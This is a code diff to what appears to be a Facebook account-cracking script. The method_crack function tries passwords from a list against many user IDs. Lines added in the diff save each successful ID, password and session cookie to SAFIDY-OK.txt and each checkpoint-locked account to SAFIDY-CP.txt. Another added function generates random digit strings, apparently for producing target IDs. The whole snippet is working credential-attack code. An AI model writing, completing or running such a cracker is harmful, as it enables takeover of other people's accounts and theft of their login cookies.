@@ -157,7 +157,25 @@ def method_crack(ids, passlist):
                     with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
-                    
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#-------------end----------------#
+
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
 
 # Appel à la fonction MR_ITACHI pour démarrer le programme
 MR_ITACHI()
